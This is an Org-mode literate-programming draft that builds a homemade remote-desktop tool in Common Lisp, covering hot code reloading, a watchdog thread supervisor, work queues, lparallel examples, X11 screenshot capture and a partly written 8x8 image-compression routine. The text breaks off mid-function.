#+STARTUP: showall indent hidestars
#+HTML_HEAD: <link rel='stylesheet' type='text/css' href='./css/style.css'/>

* Intro

[[file:./img/rc-intro.png]]

How to control a 3D printer from the next room, if the "next room" can be in another country, and there is only a GUI application to control it?

Elementary! It is enough to put a laptop next to it, point the laptop camera at the working area, understand how to get images from the screen, and control the mouse and keyboard.

A kind of "remote desktop", made by your own hands.

* Decomposition

Split it to Client and Server.

Server:
- takes screenshots
- sends screenshots to the channel
- reads commands from the channel
- executes commands

Client:
- receives screenshots
- shows screenshots to the user (or even automatically analyzes screenshots to react to them)
- generates commands to send to the Server
- sends commands to the channel

Both the Client and the Server need to be able to establish a communication channel, maintain it, and minimize the size of the sent data by packing it.

The server must also be able to update itself "on the fly" when it receives appropriate commands from the Client.

The channel of communication does not necessarily exist permanently. Sometimes the connection may be unavailable. In this case, the Server must balance the strategy of "save as many screenshots as possible, and then send them when the connection is restored" with the strategy of minimizing the channel load.

For all such high-level decision, it is convenient to design a language in which to describe them. This language will be used so that the Client can change the behavior of the Server without having to patch it, which is fraught with bugs.

Basic commands:

#+BEGIN_SRC lisp
  (take-screenshot)
  (send-screenshot)
  (receive-command)
  (execute-command)

  (receive-screenshot)
  (show-screenshot)
  (make-command)
  (send-command)

  (open-connection)
  (close-connection)
#+END_SRC

Simplified workflow:

#+BEGIN_SRC plantuml :file ./img/rc-workflow.png
  hide empty description

  state Server {
      take_screenshot -right-> send_screenshot
      send_screenshot -right[dotted,#blue]-> snd_srv_queue
      send_screenshot -down-> receive_command
      rcv_srv_queue -left[dotted,#blue]-> receive_command
      receive_command -left-> execute_command
      execute_command -up-> sleep_server
      sleep_server -up-> take_screenshot
  }

  state Client {
      send_command -left[dotted,#blue]-> snd_clt_queue
      rcv_clt_queue -right[dotted,#blue]-> receive_screenshot
      receive_screenshot -right-> show_screenshot
      show_screenshot -down-> make_command
      make_command -left-> send_command
      send_command -up-> sleep_client
      sleep_client  -up-> receive_screenshot
  }

  snd_srv_queue -[#green]> rcv_clt_queue
  snd_clt_queue -left[#green]-> rcv_srv_queue
#+END_SRC

#+results:
[[file:./img/rc-workflow.png]]

[[file:./img/rc-workflow.png]]

* Unreliable delivery

If the connection is unstable, an attempt to send a screenshot may cause a hang state. A hung attempt to send has a state and takes up memory, so the Server needs a strategy to manage this. For example, the Server can kill hung send attempts if they don't finish successfully within maximum time. Or if there are too many hanged attempts - the Server may try to reconnect. It can be expressed like this:

#+BEGIN_SRC lisp
  (defun try-to-send-screenshot (screenshot-data)
    (let ((attempt (send-screenshot screenshot-data)))
      (push attempt *list-of-attempts*)
      (let ((current-time (get-internal-real-time))
            (failed-attempts-cnt 0))
        (dolist (attempt *list-of-attempts*)
          (when (> (+ (time-of-birth attemp) max-time) current-time)
            (dismiss attempt)))
        (dolist (attempt *list-of-attempts*)
          (when (equal :dismissed (status attemp))
            (incf failed-attempts-cnt)))
        (when (> kill-cnt max-failed-attempts)
          (try-to-reconnect)))))
#+END_SRC



#+BEGIN_SRC plantuml :file ./img/rc-attempt-strategy.png
  start
  :Attempt to send a screenshot;
  :Push attempt to list of attempts;

  #white:(A)

  group dismiss the hang-up attempts to send
    repeat
      :select the current attempt;
      if (does selected attempt exist longer than necessary?) then (yes)
        :dismiss current attempt;
      endif
    repeat while (do we still have any unprocessed attempts??) is (yes)
    ->no;
  end group

  #white:(B)

  group counting the number of dismissed attempts;
    repeat
      :select the current attempt;
      if (the selected attempt is in the state of being dismissed?) then (yes)
        :increase the counter of attempts in the dismissed state;
      endif
    repeat while (do we still have any unprocessed attempts??) is (yes)
    ->no;
  end group

  #white:(C)

  if (counter of attempts in the dismissed state too big?) then (yes)
    :try to reconnect;
  endif

  stop
#+END_SRC

#+results:
[[file:./img/rc-attempt-strategy.png]]

[[file:./img/rc-attempt-strategy.png]]

* Hot code reloading

The Client can send a command to the Server, which will redefine the strategy:

#+BEGIN_SRC lisp
  (send-command
   :hot-reload-code
   '(:name try-to-send-screenshot
     (lambda (screenshot-data)
       ...)))
#+END_SRC

This way, you can define only the functions needed to provide hot reloading code and add the rest through the reloading mechanism.

At this point, the only thing required of ~send-command~ is to throw parameters to ~hot-reload-code~:

Actually, ~send-command~ has to send a command to the communication channel, which doesn't exist yet, so now you can only define ~hot-reload-code~:

#+NAME: hot-reload-code
#+BEGIN_SRC lisp
  (defmacro hot-reload-code (name code)
    `(defparameter ,(intern (concatenate 'string "*" (symbol-name name) "*"))
                            ,code))
#+END_SRC

This function is very simple, it puts the result of the executed code in a variable with the appropriate name. The content of this variable can be replaced atomically during the next code reload. For example, this is how you can create a function in a *sub* variable that subtract up two numbers:

#+BEGIN_SRC lisp
  (hot-reload-code
   :sub
   (lambda (a b) (- a b)))
#+END_SRC

And it really works:

#+BEGIN_SRC lisp
  (funcall *sub* 6 3)
  => 3 (2 bits, #x3, #o3, #b11)
#+END_SRC

However, the benefit of functions is that they call each other, but as a result of uncoordinated hot restarts of the code when called, there may be errors.

Here we can use the ~safe-call~ macro helper, which provides error handling if there is a problem with the called function:

#+NAME: with_safe_call
#+BEGIN_SRC lisp
  (defmacro with-safe-call ((err-var &body err-handler)
                            func-var &rest params)
    `(handler-case
         (funcall
          ,(intern (concatenate  'string "*" (symbol-name func-var) "*"))
          ,@params)
       (t (,err-var) ,@err-handler)))
#+END_SRC

This macro helper turns a function call into an exception handler and illustrates the idea of "defensive programming":

#+BEGIN_SRC lisp
  (macroexpand-1
   '(with-safe-call (err (format nil "SAFE-CALL-ERROR: ~A" err))
     :div 12 3))

  =>
  (handler-case (funcall *div* 12 3)
    (t (err) (format nil "SAFE-CALL-ERROR: ~A" err)))
#+END_SRC

Now if we call the *DIV* function via SAFE-CALL, we will get an error handled, because the *DIV* variable has not yet been defined:

#+BEGIN_SRC lisp
  (with-safe-call (err (format nil "SAFE-CALL-ERROR: ~A" err))
                  :DIV 12 3)

  => "SAFE-CALL-ERROR: The variable *DIV* is unbound."
#+END_SRC

Now if you define *DIV*, the call will return the correct result:

#+BEGIN_SRC lisp
  (hot-reload-code
   :DIV
   (lambda (param-a param-b)
     (block div-ret-block
       (when (= 0 param-b)
         (error 'DIVISION-BY-ZERO))
       (let ((cnt 0))
         (loop while (>= param-a param-b)
               do (setf param-a
                        (with-safe-call
                            (err (format nil "ERR: ~A" err))
                            :SUB param-a param-b)
                        cnt (+ 1 cnt))
                  (unless (numberp param-a)
                    (return-from div-ret-block param-a)))
         cnt))))

  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 12 3)
  => 4 (3 bits, #x4, #o4, #b100)
#+END_SRC

Now, if I define a *DIV* which calls *SUB* to subtract the second parameter from the first parameter, the call will return the correct result.

The call is made through WITH-SAFE-CALL, so any error in the called function will be handled.

The calling function will only continue if there are no errors.

This way we can have erroneous functions in the hot code reload code process, but it will not cause a crash because all errors will be handled if any function that can be replaced is called with-safe-call

For example, if we try to divide by zero, we will get a division by zero error handled

#+BEGIN_SRC lisp
  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 1 0)
  => "ERR: arithmetic error DIVISION-BY-ZERO signalled"
#+END_SRC

The same happens if we remove the SUB variable, the DIV just can't find the function it depends on, but handles this situation correctly:

#+BEGIN_SRC lisp
  (unbound-variable  *sub*)

  (makunbound '*sub*)

  (with-safe-call (err (format nil "ERR: ~A" err))
                  :DIV 1 1)
  => "ERR: The variable *SUB* is unbound."
#+END_SRC

* Panic

When code is hot-reloaded, something can go wrong, and then continuing to work can have unpredictable consequences.

The program can detect an abnormal situation and to prevent a disaster go into "panic" mode.

When the ~*PANIC*~ flag is not NIL the program should not continue normal operation. Instead it should save what can be saved correctly if possible and proceed to the failure analysis and recovery procedures. For example, it could try to recover to the last working state, or do something else.

#+NAME: panic
#+BEGIN_SRC lisp
  (defparameter *PANIC* nil)
#+END_SRC

* Logging and debug print

In the simplest way, any errors should cause an error message to be sent to the console for debugging purposes. This is done using the ~DBG~ macro, which accepts the error message and parameters in FORMAT-style.

When you want to display something on the screen, for example an error message in a multithreaded program, the threads should not interfere with each other. So we use a mutex wrapped in the with-recursive-lock-held macro of the bordeaux-threads package. This package is used to manage threads.

A recursive lock differs from an ordinary lock in that a thread that already holds the recursive lock can acquire it again without blocking. The thread must then release the lock twice before it becomes available for another thread.

#+NAME: dbg
#+BEGIN_SRC lisp
  (defparameter *OUTLOCK*
    (bt:make-recursive-lock "output-lock"))

  (defmacro bprint (var)
    `(subseq (with-output-to-string (*standard-output*)
               (pprint ,var)) 1))

  (defmacro dbg (msg &rest params)
    "debug output with lock"
    `(bt:with-recursive-lock-held (*OUTLOCK*)
       (format t ,msg ,@params)
       (finish-output)))
#+END_SRC

* Main loop

When the Client or the Server starts up, it enters a (conditionally) infinite loop in which the PHOENIX, which we'll talk about in the next section, is started every *SLEEP-INTERVAL* seconds. It is started through the ~with-safe-call~ mechanism we just talked about.

To atomically break this infinite loop, the variable *MAIN-LOOP-STOP* is used, which must be equal to NIL as long as the loop has to run.

If it is not NIL, its contents will be executed through ~WITH-SAFE-CALL~ and this gives us a way to atomically update the whole world.

#+NAME: main_loop
#+BEGIN_SRC lisp
  (defparameter *WATCHDOG-TIMER* 0)
  (defparameter *MAIN-LOOP-STOP* nil)
  (defparameter *SLEEP-INTERVAL* 3)

  (defun main-loop ()
    (setf *WATCHDOG-TIMER* 0)
    (tagbody
     infinite
       (when *MAIN-LOOP-STOP*
         (with-safe-call
             (err
               (dbg "~%ERR: ~A Trying to stop the main loop." err))
             :MAIN-LOOP-STOP)
         (go end))
       (dbg "~%::main-loop WDG=~3,'0D" *WATCHDOG-TIMER*)
       (with-safe-call (err (dbg "~%ERR: ~A" err))
                       :PHOENIX)
       (sleep *SLEEP-INTERVAL*)
       (incf *WATCHDOG-TIMER*)
       (go infinite)
     end
       (dbg "~%::the MAIN-LOOP is correctly terminated")))
#+END_SRC

Activity Diagram:

#+BEGIN_SRC plantuml :file ./img/rc-main-loop.png
  start
  :clear WATCHDOG_TIMER value;
  while (MAIN_LOOP_STOP is clear?) is (Yes)
     :debug print WATCHDOG_TIMER value;
     :try to call PHOENIX;
     :increment WATCHDOG_TIMER value;
  endwhile
  :try to call MAIN_LOOP_STOP;
  :debug print exit message;
  stop
#+END_SRC

#+results:
[[file:./img/rc-main-loop.png]]

[[file:./img/rc-main-loop.png]]

* Minimal tangled program

Now you can build a minimal working program:

#+NAME: min
#+BEGIN_SRC lisp :tangle ./src/min.lisp :noweb yes :exports code
  (ql:quickload "alexandria")
  (use-package :alexandria)
  (ql:quickload "cl-ppcre")
  (use-package :ppcre)
  (ql:quickload "bordeaux-threads")

  <<panic>>

  <<dbg>>

  <<with_safe_call>>

  <<main_loop>>
#+END_SRC

If you run ~main-loop~ this minimal program will start.

Every 3 seconds it will try to safely run *PHOENIX*, which doesn't exist yet, get an error here and start again until we get tired of it and change the value of the *MAIN-LOOP-STOP* variable to T for example.

Then the program will try to execute *MAIN-LOOP-STOP*, get an error and exit correctly.

#+BEGIN_SRC lisp
  ::main-loop WDG=000
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=001
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=002
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=003
  ERR: The variable *PHOENIX* is unbound.
  ::main-loop WDG=004
  ERR: The variable *PHOENIX* is unbound.
  ERR: The function COMMON-LISP:T is undefined. Trying to stop the main loop.
  ::the main-loop is correctly terminated
#+END_SRC

* Phoenix

So, the ~MAIN-LOOP~ synchronously starts the ~PHOENIX~ and then goes to sleep so as not to waste CPU time waiting.

This means that ~PHOENIX~ must complete its tasks and die quickly. After a sleep, the ~PHOENIX~ will be revived from the ashes and do its job again.

What tasks does the ~PHOENIX~ perform?

He creates the threads and controls them. Threads do all the dirty work, deal with unstable network connections, and are prone to hang-ups. If ~PHOENIX~ has reason to suspect that a thread is hanging, ~PHOENIX~ should kill the thread.

~PHOENIX~ is very suspicious; he doesn't trust threads that run too long. ~PHOENIX~ only likes threads that behave like ~PHOENIX~ himself - doing their job quickly and dying.

To determine how long a thread lives, ~PHOENIX~ can analyze how familiar it is to him. If ~PHOENIX~ sees a familiar thread in each new life, ~PHOENIX~ understands that it has met that thread in past lives.

But it is possible to do the same thing in a more optimal way.

We can name threads so that their name contains the value of the watchdog timer when the thread starts. Then we can subtract the actual watchdog value and find out the age of the thread.

** Terminating long-lived threads

This can be expressed as a rule that will kill threads that live too long:

[TODO:gmm] - https://github.com/LispCookbook/cl-cookbook/issues/386

#+NAME: rule_of_killing_threads_by_time
#+BEGIN_SRC lisp
  (defmacro with-panic-safe-call (name &rest params)
    `(with-safe-call
         (err (progn
                (setf *PANIC* t)
                (dbg "~%ERR: ~A" err)))
         ,name
         ,@params))

  (defparameter *GET-THREAD-WDG-BY-NAME*
    (lambda (thread-name)
      "returns wdg value from thread-name or nil"
      (multiple-value-bind (match regs)
          (scan-to-strings "\.*\\s+wdg=([0-9]*)"
                           thread-name)
        (when match
          (parse-integer (aref regs 0))))))

  (defconstant +max-thread-age+ 5)

  (defparameter *rule-of-killing-threads-by-time*
    (lambda ()
      (loop :for thr :in (bt:all-threads) :do
        (let* ((wdg (with-panic-safe-call :GET-THREAD-WDG-BY-NAME
                      (bt:thread-name thr))))
          (unless (equal nil wdg)
            (let ((age  (- *WATCHDOG-TIMER* wdg)))
              (or (> 0 age) ;; overflow *watchdog-timer*
                  (> age +MAX-THREAD-AGE+)
                  (unless *PANIC*
                    (bt:destroy-thread thr)))))))))
#+END_SRC

Suppose we name threads as "thread-type-name wdg=123", where "123" is the value of ~*WATCHDOG-TIMER*~ at the moment when this thread was created. Then the ~GET-THREAD-WDG-BY-NAME~ helper function, when safely called, will return "12345" to us.

If the current value of ~*WATCHDOG-TIMER*~ reaches "129", it means that the thread has been alive for 6 epochs (i.e. PHOENIX has restarted 6 times). If ~MAIN-LOOP~ falls asleep for 3 seconds after a PHOENIX restart, it means that the thread is already alive for more than 6*3=18 seconds, which is clearly more it should be.

So the ~RULE-OF-KILLING-THREADS-BY-TIME~ procedure should kill this thread if it sees that it lives more than ~+MAX-THREAD-AGE+~ epochs. [TODO:gmm] - What happens if the thread being killed is holds a lock?

It is also possible that ~*WATCHDOG-TIMER*~ is less than the value returned by ~GET-THREAD-WDG-BY-NAME~. It is possible when ~*WATCHDOG-TIMER*~ overflows and we kill all such threads without waiting until ~*WATCHDOG-TIMER*~ becomes big enough to keep a thread alive longer than expected.

The same mechanism (resetting ~*WATCHDOG-TIMER*~) can be used to restart all the threads.

[TODO:gmm] - We can also provide a negative value of ~*WATCHDOG-TIMER*~ to use it for something else, like recovering from a panic.

We will go into a panic state if, for example, when trying to call the ~GET-THREAD-WDG-BY-NAME~ procedure safely, it is found that this variable does not exist.

** Creating new threads

Now we have to make up for the lost threads somehow. To do this we will write a rule that will create missing threads if their number is less than ~+MIN-THREAD-POOL-SIZE+~

#+NAME: rule_of_creating_new_threads
#+BEGIN_SRC lisp
  (defparameter *WORKING-THREAD-STOP-FLAG* nil)

  (defparameter *WORKING-THREAD-FUNC*
    (lambda ()
      (let ((work-cnt 0)
            (work-cnt-max (random 40)))
        (tagbody
         work-repeat
           (when *WORKING-THREAD-STOP-FLAG*
             (go work-exit))
           (when (> work-cnt work-cnt-max)
             (go work-exit))
           (sleep 1)
           (go work-repeat)
         work-exit))))

  (defconstant +MIN-THREAD-POOL-SIZE+ 3)

  (defparameter *RULE-OF-CREATING-NEW-THREADS*
    (lambda ()
      (let ((working-threads-cnt 0))
        (loop :for thr :in (bt:all-threads) :do
          (let* ((wdg (with-panic-safe-call
                        :get-thread-wdg-by-name
                        (bt:thread-name thr))))
            (unless (equal nil wdg)
              (incf working-threads-cnt))))
        (when (> +MIN-THREAD-POOL-SIZE+ working-threads-cnt)
          (dotimes (idx (- +MIN-THREAD-POOL-SIZE+
                           working-threads-cnt))
            (bt:make-thread
             #'(lambda ()
                 (with-panic-safe-call
                   :WORKING-THREAD-FUNC))
             :name (format nil "++(~A)working-thread wdg=~D"
                           idx *WATCHDOG-TIMER*)
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*PANIC* . ,*PANIC*)
               (*working-thread-stop-flag* . ,*working-thread-stop-flag*))))))))

  ;; (funcall *rule-of-creating-new-threads*)

  ;; (bt:all-threads)

  ;; =>
  ;; #<SB-THREAD:THREAD "main thread" RUNNING {1001838103}>
  ;; #<SB-THREAD:THREAD "Swank Sentinel" RUNNING {10019B0AF3}>
  ;; #<SB-THREAD:THREAD "control-thread" RUNNING {1001BEE4E3}>
  ;; #<SB-THREAD:THREAD "swank-indentation-cache-thread" RUNNING {1001BEEC03}>
  ;; #<SB-THREAD:THREAD "reader-thread" RUNNING {1004E62FE3}>
  ;; #<SB-THREAD:THREAD "++(1)working-thread wdg=0" RUNNING {1003631073}>
  ;; #<SB-THREAD:THREAD "++(2)working-thread wdg=0" RUNNING {1003631383}>
  ;; #<SB-THREAD:THREAD "repl-thread" RUNNING {1002BB9DC3}>
  ;; #<SB-THREAD:THREAD "worker" RUNNING {10036402F3}>
  ;; #<SB-THREAD:THREAD "++(3)working-thread wdg=0" RUNNING {1003631693}>
  ;; #<SB-THREAD:THREAD "++(0)working-thread wdg=0" RUNNING {1003630C03}>
  ;; #<SB-THREAD:THREAD "auto-flush-thread" RUNNING {1004E62F53}>

#+END_SRC

** Rule-processor

Now that we have at least two rules for creating and deleting threads, we can build a list of rules.

This is very important, because the contents of the list of rules (and the order of the rules in the list) will determine the logic of the whole program.

#+NAME: rulez
#+BEGIN_SRC lisp
  (defclass rulez ()
    ((lst :initarg :lst)))

  (defparameter *LIST-OF-RULES*
    (make-instance 'rulez
                   :lst `(*rule-of-killing-threads-by-time*
                          ,*rule-of-creating-new-threads*)))

  (defmethod run ((rlz rulez))
    (loop for rule in (slot-value *list-of-rules* 'lst) :do
      (funcall (symbol-value rule))))
#+END_SRC

** Minimal Phoenix program

Now if we add phoenix to the minimal program obtained in the previous step, we get a thread supervisor that creates and removes threads as they exceed the maximum running time

#+BEGIN_SRC plantuml :file ./img/main_loop_and_phoenix_activity.png
  |MAIN_LOOP|
    start
    :clear WATCHDOG_TIMER value;
    while (MAIN_LOOP_STOP is clear?) is (Yes)
       :debug print WATCHDOG_TIMER value;
       :try to call PHOENIX;

       if (PHOENIX is exists?) is (exists) then
  |#AntiqueWhite|PHOENIX|
       :rule of killing threads by time;
       :rule of creating new threads;
  |MAIN_LOOP|
       else (not exists)
       endif

       :increment WATCHDOG_TIMER value;
    endwhile
    :try to call MAIN_LOOP_STOP;
    :debug print exit message;
    stop
#+END_SRC

#+results:
[[file:./img/main_loop_and_phoenix_activity.png]]

[[file:./img/main_loop_and_phoenix_activity.png]]


#+NAME: min_phoenix
#+BEGIN_SRC lisp :tangle ./src/min_phoenix.lisp :noweb yes :exports code
  <<min>>

  <<rule_of_killing_threads_by_time>>

  <<rule_of_creating_new_threads>>

  <<rulez>>

  (defparameter *phoenix*
    (lambda ()
      (run *list-of-rules*)))

  ;; (main-loop)

  ;; (bt:all-threads)
#+END_SRC

* Queues and locks

Now that Phoenix controls the threads, it's impossible to predict when a thread will be killed because it takes too long to fiddle with its bit of work.

To manage this we can have three queues: ~TODO~, ~IN-PROGRESS~, and ~DONE~ to keep track of the state of the work.

Since threads compete for jobs, we need to access these queues exclusively, with critical sections protected by mutexes - one mutex per queue

#+NAME: queue
#+BEGIN_SRC lisp
  (defclass queue ()
    ((lst   :initform  nil)
     (lock  :initarg   :lock)))

  (defmethod enque ((que queue) task)
    (bt:with-recursive-lock-held ((slot-value que 'lock))
      (setf (slot-value que 'lst)
            (append (slot-value que 'lst)
                    (list task)))))

  (defmethod deque ((que queue))
    (bt:with-recursive-lock-held ((slot-value que 'lock))
      (pop (slot-value que 'lst))))


  (defparameter *TODO*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "todo-lock")))

  (defparameter *IN-PROGRESS*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "in-progress-lock")))

  (defparameter *DONE*
    (make-instance
     'queue
     :lock (bt:make-recursive-lock "done-lock")))


  ;; (slot-value *TODO* 'lst)

  ;; (enque *TODO* 3)

  ;; (deque *TODO*)
#+END_SRC

* Tasks

[TODO:gmm] - Use LPARALEL https://lispcookbook.github.io/cl-cookbook/process.html#joining-on-a-thread-destroying-a-thread

Now we need to form tasks, which we will pass in the chain. Each task will capture the data it works with.

#+NAME: task
#+BEGIN_SRC lisp
  (defclass task ()
    ((initial :accessor initial)))
#+END_SRC

* Lparallel

#+BEGIN_SRC lisp
  (ql:quickload "lparallel")
  (ql:quickload "serapeum")
  (ql:quickload "bt-semaphore")
  (use-package :lparallel)
  (use-package :lparallel.queue)
  (use-package :bt-semaphore)

  (defun init ()
    (setf lparallel:*kernel*
          (lparallel:make-kernel (serapeum:count-cpus)
                                 :name "channel-queue-kernel")))
  (init)


  (defun shutdown ()
    (end-kernel :wait t))

  ;; (shutdown)

  (defun show-kernel-info ()
    (let ((name (lparallel:kernel-name))
          (count (lparallel:kernel-worker-count))
          (context (lparallel:kernel-context))
          (bindings (lparallel:kernel-bindings)))
      (format t "Kernel name = ~a~%" name)
      (format t "Worker threads count = ~d~%" count)
      (format t "Kernel context = ~a~%" context)
      (format t "Kernel bindings = ~a~%" bindings)))

  (show-kernel-info)


  (defun calculate-square (n)
    (let* ((channel (lparallel:make-channel))
           (res nil))
      (lparallel:submit-task channel
                             (lambda (x)
                               (* x x))
                             n)
      (setf res (lparallel:receive-result channel))
      (format t "Square of ~d = ~d~%" n res)))

  (calculate-square 25)


  (defun test-basic-channel-multiple-tasks ()
    (let ((channel (make-channel))
          (res '()))
      (submit-task channel (lambda (x)
                             (* x x))
                   10)
      (submit-task channel (lambda (y)
                             (* y y y))
                   10)
      (submit-task channel (lambda (z)
                             (* z z z z))
                   10)
      (dotimes (i 3 res)
        (push (receive-result channel) res))))

  (test-basic-channel-multiple-tasks)


  (defun test-promise ()
    (let ((p (promise)))
      (loop
        do (if (evenp (read))
               (progn
                 (fulfill p 'even-received!)
                 (return))))
      (force p)))

  (test-promise)


  (defun promise-with-threads ()
    (let ((p (promise))
          (stream *query-io*)
          (n (progn
               (princ "Enter a number: ")
               (read))))
      (format t "In main function...~A~%" p)
      (bt:make-thread
       (lambda ()
         (sleep (random 10))
         (format stream "Inside thread... fulfilling promise ~A~%" p)
         (fulfill p (* n n))))
      (bt:make-thread
       (lambda ()
         (loop
           when (fulfilledp p)
             do (return)
           do (progn
                (format stream "~d~%" (random 100))
                (sleep (* 0.01 (random 100)))))))
      (format t "Inside main function, received value: ~d~%" (force p))))

  (promise-with-threads)


  (defun test-future ()
    (let ((f (future
               (sleep (random 5))
               (print "Hello from future!"))))
      (loop
        when (fulfilledp f)
          do (return)
        do (sleep (* 0.01 (random 100)))
           (format t "~d~%" (random 100)))
      (format t "~d~%" (force f))))

  (test-future)


  (defun callback-promise-future-demo ()
    (let* ((p (promise))
           (stream *query-io*)
           (n (progn
                (princ "Enter a number: ")
                (read)))
           (f (future
                (sleep (random 10))
                (fulfill p (* n n))
                (force (future
                         (format stream "Square of ~d = ~d~%" n (force p)))))))
      (loop
        when (fulfilledp f)
          do (return (force p))
        do (sleep (* 0.01 (random 100))))))

  (callback-promise-future-demo)


  (defun list-of-promises-future-demo (n)
    (let* ((futures)
           (stream *query-io*))
      (dotimes (i n)
        (let* ((number (progn
                         (princ (format nil "~%Enter a number (~d): " i))
                         (read)))
               (promise (promise)))
          (push (future
                  (sleep (random 10))
                  (fulfill promise (* number number))
                  (force (future
                           (sleep 1)
                           (format stream "~%Square of ~d = ~d"
                                   number
                                   (force promise))
                           (force promise))))
                futures)))
      (loop
        do (sleep 1)
        until (loop for f in futures always (fulfilledp f))
        finally (return (loop for f in futures collect (force f))))))

  (list-of-promises-future-demo 3)


  (defun test-queue-properties ()
    (let ((queue (make-queue :fixed-capacity 5)))
      (loop
        when (queue-full-p queue)
          do (return)
        do (push-queue (random 100) queue))
      (print (queue-full-p queue))
      (loop
        when (queue-empty-p queue)
          do (return)
        do (print (pop-queue queue)))
      (print (queue-empty-p queue)))
    nil)

  (test-queue-properties)

  (defun test-basic-queue ()
    (let ((queue (make-queue))
          (channel (make-channel))
          (res '()))
      (submit-task channel
                   #'(lambda ()
                       (loop for entry = (pop-queue queue)
                             when (queue-empty-p queue)
                               do (return)
                             do (push (* entry entry) res))))
      (dotimes (i 100)
        (push-queue i queue))
      (receive-result channel)
      (format t "~{~d ~}~%" res)))

  (test-basic-queue)
#+END_SRC

* Screenshot

How to make screenshot:

#+NAME: x_snapshot
#+BEGIN_SRC lisp :padline no
  (ql:quickload "clx")
  (ql:quickload "zpng")

  (defmacro with-display (host (display screen root-window) &body body)
    `(let* ((,display (xlib:open-display ,host))
            (,screen (first (xlib:display-roots ,display)))
            (,root-window (xlib:screen-root ,screen)))
       (unwind-protect (progn ,@body)
         (xlib:close-display ,display))))

  (defmacro with-default-display ((display &key (force nil)) &body body)
    `(let ((,display (xlib:open-default-display)))
       (unwind-protect
            (unwind-protect
                 ,@body
              (when ,force
                (xlib:display-force-output ,display)))
         (xlib:close-display ,display))))

  (defmacro with-default-display-force ((display) &body body)
    `(with-default-display (,display :force t) ,@body))

  (defmacro with-default-screen ((screen) &body body)
    (let ((display (gensym)))
      `(with-default-display (,display)
         (let ((,screen (xlib:display-default-screen ,display)))
           ,@body))))

  (defmacro with-default-window ((window) &body body)
    (let ((screen (gensym)))
      `(with-default-screen (,screen)
         (let ((,window (xlib:screen-root ,screen)))
           ,@body))))

  (defun x-size ()
    (with-default-screen (s)
      (values
       (xlib:screen-width s)
       (xlib:screen-height s))))

  (defparameter *default-x* 0)
  (defparameter *default-y* 0)
  (defparameter *default-width* 800)
  (defparameter *default-height* 600)

  (defun init-defaults ()
    (multiple-value-bind (width height)
        (x-size)
      (setf *default-width* width
            ,*default-height* height
            ,*default-x* 0
            ,*default-y* 0)))

  (init-defaults)

  (defun raw-image->png (data width height)
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type :truecolor-alpha
                               :image-data data))
           (data (zpng:data-array png)))
      (dotimes (y height)
        (dotimes (x width)
          ;; BGR -> RGB, ref code: https://goo.gl/slubfW
          ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
          (rotatef (aref data y x 0) (aref data y x 2))
          (setf (aref data y x 3) 255)))
      png))

  (defun x-snapshot (&key (x *default-x*) (y *default-y*)
                       (width  *default-width*) (height *default-height*)
                       path)
    ;; "Return RGB data array (The dimensions correspond to the height, width,
    ;; and pixel components, see comments in x-snapsearch for more details),
    ;; or write to file (PNG only), depend on if you provide the path keyword"
    (with-default-window (w)
      (let ((image
             (raw-image->png
              (xlib:get-raw-image w :x x :y y
                                  :width width :height height
                                  :format :z-pixmap)
              width height)
            ))
        (if path
            (let* ((ext (pathname-type path))
                   (path
                    (if ext
                        path
                        (concatenate 'string path ".png")))
                   (png? (or (null ext) (equal ext "png"))))
              (cond
                (png? (zpng:write-png image path))
                (t (error "Only PNG file is supported"))))
            ;; else - return image array
            (zpng:data-array image)))))

  (x-snapshot
   :path "x-snapshot-true-color-telegram.png")
#+END_SRC

* Conv8x8

После создания скриншота нам нужно уменьшить его до минимального размера (например, для передачи по сети, если это необходимо).

Для этого мы можем разбить скриншот на квадраты 8*8 пикселей. Большинство из таких квадратов будут содержать один цвет - мы предполагаем что такие квадраты содержа цвет фона. Они нам не интересны, т.к. мы предполагаем, что они не содержат полезной текстовой информации.

Чтобы алгоритм был cache-friendly мы проходим массив пикселей строка за строкой обновляя массивы ~packflag~ и ~packline~. Каждый элемент массива ~packflag~ содержит 0 если цвет не менялся. Если же цвет менялся - то этот элемент содержит число от 1 до 64, которое представляет собой относительный порядковый номер пикселя в квадрате 8*8, где было обнаружено изменение цвета. Элементы массива ~packline~, содержащат цвет всего квадрата 8*8, если цвет не менялся или цвет тех первых точек квадрата до изменения цвета, если считать от левого верхнего угла квадрата.

#+BEGIN_SRC lisp
  (ql:quickload "png")

  (defmacro pin (yy xx aa bb cc)
    `(progn
       (setf (aref new ,yy ,xx 0) ,aa)
       (setf (aref new ,yy ,xx 1) ,bb)
       (setf (aref new ,yy ,xx 2) ,cc)))

  (declaim (inline copy-png))

  (declaim (ftype (function (string string) fixnum)
                  copy-png))

  (setf *features*
        (remove :packrest *features*))

  ;; (pushnew :packrest *features*)


  (defun conv-8x8 (img)
    (declare (optimize (speed 3))
             (optimize (safety 0)))
    (let* ((width      (the fixnum (logand -8 (png:image-width img))))
           (height     (the fixnum (logand -8 (png:image-height img))))
           (channels   (the fixnum (png:image-channels img)))
           (bit-depth  (the fixnum (png:image-bit-depth img)))
           (packflag   (make-array `(,(ash height -3) ,(ash width -3))
                                   :element-type 'fixnum))
           (packline   (make-array `(,(ash height -3) ,(ash width -3) ,channels)
                                   :element-type '(unsigned-byte 8))))
      ;; packflag - это массив флагов равных нулю, когда в квадрате 8*8 есть только один цвет
      ;; packline - это массив этих цветов в обрабатываемой строке пикселей
      (declare  (type fixnum width)     (type fixnum height)
                (type fixnum channels)  (type fixnum bit-depth))
      (do* ((yy1      0  (+ 1 yy1))
            (yy-8-p   0  (logand yy1 7)) ;; true когда y-координата кратна 8
            (yy3      0  (ash yy1 -3)))  ;; y-индекс в массиве packflag
           ((>= yy1 height))
        (declare (type fixnum yy1) (type fixnum yy-8-p) (type fixnum yy3))
        (do* ((xx1      0  (+ 1 xx1))
              (xx-8-p   0  (logand xx1 7)) ;; true когда x-координата кратна 8
              (xx3      0  (ash xx1 -3)))  ;; x-индекс в массиве packflag
             ((>= xx1 width))
          (declare (type fixnum xx1) (type fixnum xx-8-p) (type fixnum xx3))
          (block internal-loop
            (if (= 0 xx-8-p yy-8-p)
